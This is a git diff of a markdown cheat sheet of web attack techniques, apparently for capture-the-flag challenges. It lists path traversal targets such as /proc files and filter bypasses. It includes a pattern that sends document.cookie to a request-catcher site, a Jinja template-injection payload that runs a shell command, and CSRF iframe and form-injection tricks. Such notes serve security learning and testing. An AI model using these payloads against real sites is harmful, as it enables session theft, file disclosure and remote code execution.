@@ -77,7 +77,8 @@ Pass this:
 ```
 
 ## Path Traversal
-
+Wordlist for ffuf:
+  https://raw.githubusercontent.com/drtychai/wordlists/refs/heads/master/dirb/common.txt
 Useful to check:
 - admin.php
 - login.php
@@ -90,6 +91,11 @@ Useful to check:
   - /proc/self/cwd returns the program working directory
   - /proc/self/cmdline returns the command line that was used to start the process
   - /proc/self/exe returns the executable that was used to start the process
+  - /proc/version returns the version of the kernel
+  - /proc/mounts returns the mounted filesystems
+  - /proc/net/arp returns the ARP table
+  - /proc/net/tcp returns the TCP connections
+  - /proc/net/udp returns the UDP connections
 - /etc/apache2/sites-enabled/000-default or /etc/apache2/sites-available/default
 - if ../ is sanitized, try ....// or ....\/
 - may need to double urlencode 
@@ -119,7 +125,7 @@ If we can upload and choose the file name:
 
 To try to intercept requests from the page:
 
-https://requestbin.myworkato.com/
+https://beeceptor.com/
 
 Can add link to img src, or change window.location to this and add "?flag=" + document.cookie
 
@@ -129,6 +135,11 @@ Can add link to img src, or change window.location to this and add "?flag=" + do
   - document.body.innerHTML
 
 If we can add css we can use the payload in `tools/css-keylogger' to capture keystrokes
+
+If we need to do a GET request without js, we can add an img src with the link we want to send the request to
+
+If we need to do a POST request without js, we can add a form with the method set to POST and the action set to the link we want to send the request to (needs user/bot to click on it)
+
 
 ### Different Angular XSS payloads
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
@@ -141,6 +152,9 @@ Python example:
 {{().__class__.__bases__[0].__subclasses__()[356](["/bin/cat","flag"], stdout=-1).communicate()}}
 # loops and if are also possible :
 {% for i in range(100) %}{%if i % 2 == 0 %}{{i}}{% endif %}{% endfor %}
+# Variables are also possible
+{% set a=self %}
+{% set a=a.__init__ %}
 ```
 Payloads: 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
@@ -194,7 +208,8 @@ To recognize:
 
 - Only protection is a Session cookie
 - no headers with "CSRF"
-
+- need to send a request we can't from our computer
+  - ex: need admin cookie, need to reach separate service
 Payload example:
 ```html
 <iframe style="display:none" name="csrf-frame"></iframe>
@@ -212,6 +227,9 @@ https://security.love/CSRF-PoC-Genorator/
   - Try switching one char
   - Try switching it with one from another request
 
+- Try:
+  - Open form bracket and not closing it
+    - if there are buttons under, they will send the request in the form on click
 ## XSLT
 
 https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XSLT%20Processing%20Security%20and%20Server%20Side%20Request%20Forgeries%20-%20OWASP%20Switzerland%20Meeting%202015.pdf
